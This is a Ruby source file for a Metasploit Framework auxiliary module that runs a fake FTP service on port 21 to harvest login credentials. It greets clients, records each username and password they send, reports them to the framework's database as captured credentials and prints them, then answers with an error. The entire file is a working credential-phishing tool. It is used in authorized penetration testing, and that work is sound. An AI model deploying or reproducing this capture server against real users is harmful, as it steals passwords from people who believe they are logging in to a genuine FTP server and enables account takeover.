##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Authentication Capture: FTP',
            'Description'    => %q{
              This module provides a fake FTP service that
              is designed to capture authentication credentials.
            },
            'Author'      => ['ddz', 'hdm'],
            'License'     => MSF_LICENSE,
            'Actions'     =>
                [
                    [ 'Capture' ]
                ],
            'PassiveActions' =>
                [
                    'Capture'
                ],
            'DefaultAction'  => 'Capture'
        )
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
      ], self.class)
  end

  def setup
    super
    @state = {}
  end

  def run
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "220 FTP Server Ready\r\n"
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""

    if(cmd.upcase == "USER")
      @state[c][:user] = arg
      c.put "331 User name okay, need password...\r\n"
      return
    end

    if(cmd.upcase == "QUIT")
      c.put "221 Logout\r\n"
      return
    end

    if(cmd.upcase == "PASS")
      @state[c][:pass] = arg

      report_auth_info(
        :host      => @state[c][:ip],
        :port => datastore['SRVPORT'],
        :sname     => 'ftp',
        :user      => @state[c][:user],
        :pass      => @state[c][:pass],
        :source_type => "captured",
        :active    => true
      )

      print_status("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
    end

    @state[c][:pass] = data.strip
    c.put "500 Error\r\n"
    return

  end

  def on_client_close(c)
    @state.delete(c)
  end


end
